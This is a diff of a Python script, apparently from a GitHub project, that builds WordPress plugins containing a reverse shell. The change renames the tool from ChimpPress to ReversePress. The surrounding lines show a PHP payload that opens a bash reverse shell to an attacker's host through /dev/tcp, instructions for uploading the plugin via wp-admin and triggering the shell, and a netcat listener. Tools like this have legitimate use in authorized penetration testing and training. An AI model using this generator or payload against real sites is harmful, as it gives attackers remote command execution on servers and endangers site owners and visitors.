@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-### chimpPress.py                               ###
+### reversePress.py                               ###
 ### A WordPress reverse shell plugin generator  ###
 ### github.com/MachadoOtto                      ###
 
@@ -19,7 +19,7 @@ NOCOLOR = '\33[0m'
 # Default Plugin Information
 PLUGIN_INFO = '''<?php
 /**
- * Plugin Name: ChimpPress
+ * Plugin Name: ReversePress
  * Version: 1.0.0
  * Author: MachadoOtto
  * Author URI: https://github.com/MachadoOtto
@@ -33,7 +33,7 @@ PAYLOAD = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'") ?
 # Visual Functions
 def printScreen():
     t = """┌───────────────────────────────────────────────►
-│{1}###{0}   {2}chimpPress.py{0}                         {1}###{0}│
+│{1}###{0}   {2}reversePress.py{0}                         {1}###{0}│
 │{1}###{0}   {3}A WordPress plugin generator...{0}       {1}###{0}│
 │{1}###{0}   {3}        ... with a reverse shell!!!{0}   {1}###{0}│
 │{1}###{0}   github.com/MachadoOtto                {1}###{0}│
@@ -101,9 +101,9 @@ def generatePlugin(host, port, input_file, output_file):
     print('[' + GREEN + 'INFO' + NOCOLOR + ']: Plugin saved as ' + output_file + '\n')
     print('[' + BLUE + 'INFO' + NOCOLOR + ']: Upload the plugin at http://<target_domain>/wp-admin/plugin-install.php?tab=upload')
     if input_file_name:
-        print('[' + BLUE + 'INFO' + NOCOLOR + ']: Trigger the reverse shell at http://<target_domain>/wp-content/plugins/ChimpPress/' + input_file_name)
+        print('[' + BLUE + 'INFO' + NOCOLOR + ']: Trigger the reverse shell at http://<target_domain>/wp-content/plugins/ReversePress/' + input_file_name)
     else:
-        print('[' + BLUE + 'INFO' + NOCOLOR + ']: Trigger the reverse shell at http://<target_domain>/wp-content/plugins/ChimpPress/reverse_shell.php')
+        print('[' + BLUE + 'INFO' + NOCOLOR + ']: Trigger the reverse shell at http://<target_domain>/wp-content/plugins/ReversePress/reverse_shell.php')
 
 # Start Netcat Listener
 def startListener(port):
